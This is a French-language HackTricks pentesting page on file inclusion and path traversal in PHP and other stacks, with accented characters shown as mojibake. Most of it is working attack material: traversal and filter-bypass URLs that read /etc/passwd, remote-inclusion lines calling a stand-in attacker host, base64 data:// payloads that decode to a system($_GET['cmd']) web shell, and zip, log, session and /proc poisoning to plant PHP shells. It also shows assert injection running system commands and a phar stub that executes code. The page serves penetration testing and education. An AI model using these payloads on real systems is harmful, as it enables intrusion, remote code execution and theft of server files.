# Inclusion de Fichier/Travers√©e de Chemin

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Rejoignez le serveur [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) pour communiquer avec des hackers exp√©riment√©s et des chasseurs de primes de bugs !

**Aper√ßus du Piratage**\
Engagez-vous avec du contenu qui plonge dans le frisson et les d√©fis du piratage

**Nouvelles du Piratage en Temps R√©el**\
Restez √† jour avec le monde du piratage rapide gr√¢ce √† des nouvelles et des aper√ßus en temps r√©el

**Derni√®res Annonces**\
Restez inform√© avec le lancement des derni√®res primes de bugs et les mises √† jour cruciales de la plateforme

**Rejoignez-nous sur** [**Discord**](https://discord.com/invite/N3FrSbmwdy) et commencez √† collaborer avec les meilleurs hackers d√®s aujourd'hui !

## Inclusion de Fichier

**Inclusion de Fichier Distant (RFI) :** Le fichier est charg√© depuis un serveur distant (Id√©al : Vous pouvez √©crire le code et le serveur l'ex√©cutera). En php, ceci est **d√©sactiv√©** par d√©faut (**allow\_url\_include**).\
**Inclusion de Fichier Local (LFI) :** Le serveur charge un fichier local.

La vuln√©rabilit√© se produit lorsque l'utilisateur peut contr√¥ler d'une mani√®re ou d'une autre le fichier qui va √™tre charg√© par le serveur.

**Fonctions PHP vuln√©rables** : require, require\_once, include, include\_once

Un outil int√©ressant pour exploiter cette vuln√©rabilit√© : [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Aveugle - Int√©ressant - Fichiers LFI2RCE
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**En m√©langeant plusieurs listes LFI \*nix et en ajoutant plus de chemins, j'ai cr√©√© celle-ci :**

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt" %}

Essayez √©galement de changer `/` par `\`\
Essayez aussi d'ajouter `../../../../../`

Une liste qui utilise plusieurs techniques pour trouver le fichier /etc/password (pour v√©rifier si la vuln√©rabilit√© existe) peut √™tre trouv√©e [ici](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

En fusionnant plusieurs listes, j'ai cr√©√© :

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt" %}

Essayez √©galement de changer `/` par `\`\
Essayez aussi de supprimer `C:/` et d'ajouter `../../../../../`

Une liste qui utilise plusieurs techniques pour trouver le fichier /boot.ini (pour v√©rifier si la vuln√©rabilit√© existe) peut √™tre trouv√©e [ici](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

V√©rifiez la liste LFI de linux.

## LFI de base et contournements

Tous les exemples sont pour l'Inclusion de Fichier Local mais pourraient aussi √™tre appliqu√©s √† l'Inclusion de Fichier Distant (page=[http://myserver.com/phpshellcode.txt\\](http://myserver.com/phpshellcode.txt\)/).
```
http://example.com/index.php?page=../../../etc/passwd
```
### s√©quences de travers√©e supprim√©es de mani√®re non r√©cursive
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Octet nul (%00)**

Contourner l'ajout de caract√®res suppl√©mentaires √† la fin de la cha√Æne fournie (contournement de : $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
Ce probl√®me est **r√©solu depuis PHP 5.4**

### **Encodage**

Vous pourriez utiliser des encodages non standard tels que le double encodage d'URL (et d'autres) :
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### Depuis un dossier existant

Peut-√™tre que le back-end v√©rifie le chemin du dossier :
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Identification des dossiers sur un serveur

Selon le code applicatif / les caract√®res autoris√©s, il pourrait √™tre possible d'explorer r√©cursivement le syst√®me de fichiers en d√©couvrant des dossiers et pas seulement des fichiers. Pour ce faire :

* identifiez la "profondeur" de votre r√©pertoire actuel en r√©cup√©rant avec succ√®s `/etc/passwd` (si sous Linux) :
```
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
* essayez de deviner le nom d'un dossier dans le r√©pertoire courant en ajoutant le nom du dossier (ici, `private`), puis en revenant √† `/etc/passwd` :
```
http://example.com/index.php?page=private/../../../../etc/passwd # we went deeper down one level, so we have to go 3+1=4 levels up to go back to /etc/passwd
```
* si l'application est vuln√©rable, il pourrait y avoir deux r√©sultats diff√©rents √† la requ√™te :
* si vous obtenez une erreur / pas de sortie, le dossier `private` n'existe pas √† cet emplacement
* si vous obtenez le contenu de `/etc/passwd`, vous avez valid√© qu'il y a effectivement un dossier `private` dans votre r√©pertoire courant
* le(s) dossier(s) que vous avez d√©couvert en utilisant cette technique peuvent ensuite √™tre explor√©s pour des fichiers (en utilisant une m√©thode LFI classique) ou pour des sous-dossiers en utilisant la m√™me technique de mani√®re r√©cursive.

Il est possible d'adapter cette technique pour trouver des r√©pertoires √† n'importe quel emplacement dans le syst√®me de fichiers. Par exemple, si, sous la m√™me hypoth√®se (r√©pertoire courant √† la profondeur 3 du syst√®me de fichiers), vous souhaitez v√©rifier si `/var/www/` contient un r√©pertoire `private`, utilisez le payload suivant :
```
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
La s√©quence de commandes suivante permet la g√©n√©ration de charges utiles en utilisant `sed` (1) comme entr√©e pour des outils de fuzzing d'URL tels que `ffuf` (2) :
```
$ sed 's_^_../../../var/www/_g' /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt | sed 's_$_/../../../etc/passwd_g' > payloads.txt
$ ffuf -u http://example.com/index.php?page=FUZZ -w payloads.txt -mr "root"
$ ffuf -u http://owasp.ctf.intigriti.io/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200 -e '.php~,.php.old,.php.bak,.php.swp,.php.sav,.php.save'
```
Bien s√ªr, adaptez ces charges utiles √† vos besoins en termes de profondeur / emplacement / liste de r√©pertoires d'entr√©e.

### **Troncature de chemin**

Contourner l'ajout de caract√®res suppl√©mentaires √† la fin de la cha√Æne fournie (contournement de : $\_GET\['param']."php")
```
In PHP: /etc/passwd = /etc//passwd = /etc/./passwd = /etc/passwd/ = /etc/passwd/.
Check if last 6 chars are passwd --> passwd/
Check if last 4 chars are ".php" --> shellcode.php/.
```

```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd..\.\.\.\.\.\.\.\.\.\.\[ADD MORE]\.\.
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.

#With the next options, by trial and error, you have to discover how many "../" are needed to delete the appended string but not "/etc/passwd" (near 2027)

http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
Toujours essayer de **commencer** le chemin **avec un r√©pertoire factice** (a/).

**Cette vuln√©rabilit√© a √©t√© corrig√©e dans PHP 5.3.**

### **Astuces pour contourner les filtres**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Inclusion de fichier √† distance

En php, cela est d√©sactiv√© par d√©faut car **`allow_url_include`** est **Off.** Il doit √™tre **On** pour fonctionner, et dans ce cas, vous pourriez inclure un fichier PHP depuis votre serveur et obtenir une ex√©cution de code √† distance (RCE) :
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
Si pour une raison quelconque **`allow_url_include`** est **On**, mais que PHP **filtre** l'acc√®s aux pages web externes, [selon cet article](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), vous pourriez par exemple utiliser le protocole de donn√©es avec base64 pour d√©coder un code PHP b64 et obtenir une ex√©cution de code √† distance (RCE) :

{% code overflow="wrap" %}
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
{% endcode %}

{% hint style="info" %}
Dans le code pr√©c√©dent, le `+.txt` final a √©t√© ajout√© parce que l'attaquant avait besoin d'une cha√Æne qui se terminait par `.txt`, donc la cha√Æne se termine par cela et apr√®s le d√©codage b64, cette partie retournera juste des donn√©es inutiles et le vrai code PHP sera inclus (et donc, ex√©cut√©).
{% endhint %}

Un autre exemple **sans utiliser le protocole `php://`** serait :

{% code overflow="wrap" %}
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
## √âl√©ment racine Python

En python dans un code comme celui-ci :
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
Si l'utilisateur transmet un **chemin absolu** √† **`file_name`**, **le chemin pr√©c√©dent est simplement supprim√©** :
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
Voici le comportement pr√©vu selon [la documentation](https://docs.python.org/3.10/library/os.path.html#os.path.join) :

> Si un composant est un chemin absolu, tous les composants pr√©c√©dents sont ignor√©s et la jonction continue √† partir du composant de chemin absolu.

## Java List Directories

Il semble que si vous avez une Traversal de chemin en Java et que vous **demandez un r√©pertoire** au lieu d'un fichier, **une liste du r√©pertoire est retourn√©e**. Ce comportement ne se produira pas dans d'autres langages (√† ma connaissance).

## Top 25 param√®tres

Voici une liste des 25 principaux param√®tres qui pourraient √™tre vuln√©rables aux vuln√©rabilit√©s d'inclusion de fichiers locaux (LFI) (depuis [lien](https://twitter.com/trbughunters/status/1279768631845494787)) :
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI en utilisant les protocoles et wrappers PHP

### php://filter

Les filtres PHP permettent d'effectuer des **op√©rations de modification de base sur les donn√©es** avant qu'elles ne soient lues ou √©crites. Il existe 5 cat√©gories de filtres :

* [Filtres de cha√Ænes](https://www.php.net/manual/fr/filters.string.php) :
* `string.rot13`
* `string.toupper`
* `string.tolower`
* `string.strip_tags` : Supprime les balises des donn√©es (tout ce qui se trouve entre les caract√®res "<" et ">")
* Notez que ce filtre a disparu des versions modernes de PHP
* [Filtres de conversion](https://www.php.net/manual/fr/filters.convert.php)
* `convert.base64-encode`
* `convert.base64-decode`
* `convert.quoted-printable-encode`
* `convert.quoted-printable-decode`
* `convert.iconv.*` : Transforme en un encodage diff√©rent (`convert.iconv.<input_enc>.<output_enc>`). Pour obtenir la **liste de tous les encodages** pris en charge, ex√©cutez dans la console : `iconv -l`

{% hint style="warning" %}
En abusant du filtre de conversion `convert.iconv.*`, vous pouvez **g√©n√©rer du texte arbitraire**, ce qui pourrait √™tre utile pour √©crire du texte arbitraire ou faire en sorte qu'une fonction comme include traite du texte arbitraire. Pour plus d'informations, consultez [**LFI2RCE via les filtres PHP**](lfi2rce-via-php-filters.md).
{% endhint %}

* [Filtres de compression](https://www.php.net/manual/fr/filters.compression.php)
* `zlib.deflate` : Compresse le contenu (utile si exfiltration de beaucoup d'informations)
* `zlib.inflate` : D√©compresse les donn√©es
* [Filtres de chiffrement](https://www.php.net/manual/fr/filters.encryption.php)
* `mcrypt.*` : Obsol√®te
* `mdecrypt.*` : Obsol√®te
* Autres filtres
* En ex√©cutant `var_dump(stream_get_filters());` dans PHP, vous pouvez trouver quelques **filtres inattendus** :
* `consumed`
* `dechunk` : inverse l'encodage HTTP en morceaux
* `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,¬£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
{% hint style="warning" %}
La partie "php://filter" n'est pas sensible √† la casse
{% endhint %}

### php://fd

Ce wrapper permet d'acc√©der aux descripteurs de fichiers que le processus a ouverts. Potentiellement utile pour exfiltrer le contenu des fichiers ouverts :
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
Vous pouvez √©galement utiliser **php://stdin, php://stdout et php://stderr** pour acc√©der aux **descripteurs de fichiers 0, 1 et 2** respectivement (pas s√ªr de l'utilit√© de cela dans une attaque)

### zip:// et rar://

T√©l√©chargez un fichier Zip ou Rar contenant un PHPShell et acc√©dez-y.\
Pour pouvoir abuser du protocole rar, il doit **√™tre sp√©cifiquement activ√©**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Fait amusant : vous pouvez d√©clencher un XSS et contourner l'auditeur Chrome avec : `http://example.com/index.php?page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+`

Notez que ce protocole est restreint par les configurations php **`allow_url_open`** et **`allow_url_include`**

### expect://

Expect doit √™tre activ√©. Vous pouvez ex√©cuter du code en utilisant ceci.
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

Sp√©cifiez votre payload dans les param√®tres POST
```
http://example.com/index.php?page=php://input
POST DATA: <?php system('id'); ?>
```
### phar://

Un fichier `.phar` peut √©galement √™tre utilis√© pour ex√©cuter du code PHP si le site web utilise une fonction comme `include` pour charger le fichier.

{% code title="create_phar.php" %}
```python
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');

$phar->stopBuffering();
```
```markdown
{% endcode %}

Et vous pouvez compiler le `phar` en ex√©cutant la ligne suivante :
```
```bash
php --define phar.readonly=0 create_path.php
```
Un fichier appel√© `test.phar` sera g√©n√©r√© que vous pouvez utiliser pour exploiter la LFI.

Si la LFI se contente de lire le fichier et n'ex√©cute pas le code PHP √† l'int√©rieur, par exemple en utilisant des fonctions comme _**file\_get\_contents(), fopen(), file() ou file\_exists(), md5\_file(), filemtime() ou filesize()**_**.** Vous pouvez essayer d'exploiter une **d√©s√©rialisation** survenant lors de la **lecture** d'un **fichier** en utilisant le protocole **phar**.\
Pour plus d'informations, lisez le post suivant :

{% content-ref url="phar-deserialization.md" %}
[phar-deserialization.md](phar-deserialization.md)
{% endcontent-ref %}

### Plus de protocoles

V√©rifiez plus de [**protocoles possibles √† inclure ici**](https://www.php.net/manual/fr/wrappers.php)**:**

* [php://memory et php://temp](https://www.php.net/manual/fr/wrappers.php.php#wrappers.php.memory) ‚Äî √âcrire en m√©moire ou dans un fichier temporaire (pas s√ªr de l'utilit√© dans une attaque par inclusion de fichier)
* [file://](https://www.php.net/manual/fr/wrappers.file.php) ‚Äî Acc√®s au syst√®me de fichiers local
* [http://](https://www.php.net/manual/fr/wrappers.http.php) ‚Äî Acc√®s aux URL HTTP(s)
* [ftp://](https://www.php.net/manual/fr/wrappers.ftp.php) ‚Äî Acc√®s aux URL FTP(s)
* [zlib://](https://www.php.net/manual/fr/wrappers.compression.php) ‚Äî Flux de compression
* [glob://](https://www.php.net/manual/fr/wrappers.glob.php) ‚Äî Recherche de chemins correspondant √† un motif (Il ne retourne rien d'imprimable, donc pas vraiment utile ici)
* [ssh2://](https://www.php.net/manual/fr/wrappers.ssh2.php) ‚Äî Secure Shell 2
* [ogg://](https://www.php.net/manual/fr/wrappers.audio.php) ‚Äî Flux audio (Inutile pour lire des fichiers arbitraires)

## LFI via l'assertion de PHP

Si vous rencontrez une LFI difficile qui semble filtrer les cha√Ænes de travers√©e comme ".." et r√©pond par quelque chose comme "Tentative de piratage" ou "Bien essay√© !", un payload d'injection 'assert' peut fonctionner.

Un payload comme celui-ci :
```
' and die(show_source('/etc/passwd')) or '
```
r√©ussira √† exploiter le code PHP pour un param√®tre "file" qui ressemble √† ceci :
```bash
assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");
```
Il est √©galement possible d'obtenir un RCE dans une instruction "assert" vuln√©rable en utilisant la fonction system() :
```
' and die(system("whoami")) or '
```
Assurez-vous d'encoder les URL des charges utiles avant de les envoyer.

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Rejoignez le serveur [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) pour communiquer avec des hackers exp√©riment√©s et des chasseurs de primes de bugs !

**Aper√ßus du Hacking**\
Engagez-vous avec du contenu qui plonge dans l'excitation et les d√©fis du hacking

**Nouvelles du Hacking en Temps R√©el**\
Restez √† jour avec le monde du hacking rapide gr√¢ce √† des nouvelles et des aper√ßus en temps r√©el

**Derni√®res Annonces**\
Restez inform√© avec les derni√®res primes de bugs lanc√©es et les mises √† jour cruciales de la plateforme

**Rejoignez-nous sur** [**Discord**](https://discord.com/invite/N3FrSbmwdy) et commencez √† collaborer avec les meilleurs hackers d√®s aujourd'hui !

## PHP Blind Path Traversal

{% hint style="warning" %}
Cette technique est pertinente dans les cas o√π vous **contr√¥lez** le **chemin du fichier** d'une **fonction PHP** qui acc√©dera √† un fichier mais vous ne verrez pas le contenu du fichier (comme un simple appel √† **`file()`**), mais le contenu n'est pas affich√©.
{% endhint %}

Dans [**cet incroyable article**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html), il est expliqu√© comment un blind path traversal peut √™tre exploit√© via le filtre PHP pour **exfiltrer le contenu d'un fichier via un oracle d'erreur**.

En r√©sum√©, la technique utilise l'encodage **"UCS-4LE"** pour rendre le contenu d'un fichier si **grand** que la **fonction PHP ouvrant** le fichier d√©clenchera une **erreur**.

Ensuite, afin de fuiter le premier caract√®re, le filtre **`dechunk`** est utilis√© avec d'autres tels que **base64** ou **rot13** et enfin les filtres **convert.iconv.UCS-4.UCS-4LE** et **convert.iconv.UTF16.UTF-16BE** sont utilis√©s pour **placer d'autres caract√®res au d√©but et les fuiter**.

**Fonctions qui pourraient √™tre vuln√©rables** : `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (seulement cible en lecture seule avec ceci)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

Pour les d√©tails techniques, consultez l'article mentionn√© !

## LFI2RCE

### Inclusion de Fichier √† Distance

Expliqu√© pr√©c√©demment, [**suivez ce lien**](./#remote-file-inclusion).

### Via le fichier log Apache/Nginx

Si le serveur Apache ou Nginx est **vuln√©rable √† LFI** √† l'int√©rieur de la fonction include, vous pourriez essayer d'acc√©der √† **`/var/log/apache2/access.log` ou `/var/log/nginx/access.log`**, d√©finir √† l'int√©rieur de **l'agent utilisateur** ou dans un **param√®tre GET** un shell PHP comme **`<?php system($_GET['c']); ?>`** et inclure ce fichier

{% hint style="warning" %}
Notez que **si vous utilisez des guillemets doubles** pour le shell au lieu de **guillemets simples**, les guillemets doubles seront modifi√©s pour la cha√Æne "_**quote;**_", **PHP lancera une erreur** et **rien d'autre ne sera ex√©cut√©**.

De plus, assurez-vous d'**√©crire correctement la charge utile** ou PHP g√©n√©rera une erreur chaque fois qu'il essaiera de charger le fichier log et vous n'aurez pas de seconde chance.
{% endhint %}

Cela pourrait √©galement √™tre fait dans d'autres logs mais **soyez prudent,** le code √† l'int√©rieur des logs pourrait √™tre encod√© en URL et cela pourrait d√©truire le Shell. L'en-t√™te **authorisation "basic"** contient "user:password" en Base64 et il est d√©cod√© √† l'int√©rieur des logs. Le PHPShell pourrait √™tre ins√©r√© √† l'int√©rieur de cet en-t√™te.\
Autres chemins de logs possibles :
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Liste de fuzzing : [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### Via Email

**Envoyez un mail** √† un compte interne (user@localhost) contenant votre payload PHP comme `<?php echo system($_REQUEST["cmd"]); ?>` et essayez d'inclure le mail de l'utilisateur avec un chemin tel que **`/var/mail/<NOMUTILISATEUR>`** ou **`/var/spool/mail/<NOMUTILISATEUR>`**

### Via /proc/\*/fd/\*

1. T√©l√©chargez beaucoup de shells (par exemple : 100)
2. Incluez [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), avec $PID = PID du processus (peut √™tre forc√© par brute force) et $FD le descripteur de fichier (peut aussi √™tre forc√© par brute force)

### Via /proc/self/environ

Comme un fichier log, envoyez le payload dans le User-Agent, il sera refl√©t√© √† l'int√©rieur du fichier /proc/self/environ
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Via t√©l√©chargement

Si vous pouvez t√©l√©charger un fichier, injectez simplement le payload de la coquille dedans (par exemple : `<?php system($_GET['c']); ?>`).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
Afin de maintenir le fichier lisible, il est pr√©f√©rable d'injecter dans les m√©tadonn√©es des images/documents/PDF

### Via l'upload de fichier Zip

T√©l√©chargez un fichier ZIP contenant une coquille PHP compress√©e et acc√©dez :
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### Via les sessions PHP

V√©rifiez si le site utilise une session PHP (PHPSESSID)
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
En PHP, ces sessions sont stock√©es dans les fichiers _/var/lib/php5/sess\\_\[PHPSESSID]\_
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
D√©finissez le cookie √† `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
Utilisez le LFI pour inclure le fichier de session PHP
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### Via ssh

Si ssh est actif, v√©rifiez quel utilisateur est utilis√© (/proc/self/status & /etc/passwd) et essayez d'acc√©der √† **\<HOME>/.ssh/id\_rsa**

### **Via** **vsftpd** _**logs**_

Les logs de ce serveur FTP sont stock√©s dans _**/var/log/vsftpd.log.**_ Si vous avez un LFI et pouvez acc√©der √† un serveur vsftpd expos√©, vous pourriez essayer de vous connecter en d√©finissant le payload PHP dans le nom d'utilisateur, puis acc√©der aux logs en utilisant le LFI.

### Via le filtre base64 de php (utilisant base64)

comme montr√© dans [cet](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) article, le filtre base64 de PHP ignore simplement les Non-base64. Vous pouvez utiliser cela pour contourner la v√©rification de l'extension de fichier : si vous fournissez du base64 qui se termine par ".php", il ignorera simplement le "." et ajoutera "php" au base64. Voici un exemple de payload :
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Via php filters (no file needed)

Ce [**writeup**](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) explique que vous pouvez utiliser **des filtres php pour g√©n√©rer un contenu arbitraire** en sortie. Cela signifie essentiellement que vous pouvez **g√©n√©rer du code php arbitraire** pour l'inclusion **sans avoir besoin d'√©crire** dans un fichier.

{% content-ref url="lfi2rce-via-php-filters.md" %}
[lfi2rce-via-php-filters.md](lfi2rce-via-php-filters.md)
{% endcontent-ref %}

### Via segmentation fault

**T√©l√©chargez** un fichier qui sera stock√© de mani√®re **temporaire** dans `/tmp`, puis dans la **m√™me requ√™te**, d√©clenchez un **segmentation fault**, et alors le **fichier temporaire ne sera pas supprim√©** et vous pourrez le rechercher.

{% content-ref url="lfi2rce-via-segmentation-fault.md" %}
[lfi2rce-via-segmentation-fault.md](lfi2rce-via-segmentation-fault.md)
{% endcontent-ref %}

### Via Nginx temp file storage

Si vous avez trouv√© une **Local File Inclusion** et que **Nginx** est utilis√© devant PHP, vous pourriez obtenir un RCE avec la technique suivante :

{% content-ref url="lfi2rce-via-nginx-temp-files.md" %}
[lfi2rce-via-nginx-temp-files.md](lfi2rce-via-nginx-temp-files.md)
{% endcontent-ref %}

### Via PHP\_SESSION\_UPLOAD\_PROGRESS

Si vous avez trouv√© une **Local File Inclusion** m√™me si vous **n'avez pas de session** et que `session.auto_start` est sur `Off`. Si vous fournissez le **`PHP_SESSION_UPLOAD_PROGRESS`** dans des donn√©es **multipart POST**, PHP **activera la session pour vous**. Vous pourriez abuser de cela pour obtenir un RCE :

{% content-ref url="via-php_session_upload_progress.md" %}
[via-php\_session\_upload\_progress.md](via-php\_session\_upload\_progress.md)
{% endcontent-ref %}

### Via temp file uploads in Windows

Si vous avez trouv√© une **Local File Inclusion** et que le serveur fonctionne sous **Windows**, vous pourriez obtenir un RCE :

{% content-ref url="lfi2rce-via-temp-file-uploads.md" %}
[lfi2rce-via-temp-file-uploads.md](lfi2rce-via-temp-file-uploads.md)
{% endcontent-ref %}

### Via phpinfo() (file\_uploads = on)

Si vous avez trouv√© une **Local File Inclusion** et un fichier exposant **phpinfo()** avec file\_uploads = on, vous pouvez obtenir un RCE :

{% content-ref url="lfi2rce-via-phpinfo.md" %}
[lfi2rce-via-phpinfo.md](lfi2rce-via-phpinfo.md)
{% endcontent-ref %}

### Via compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Path Disclosure

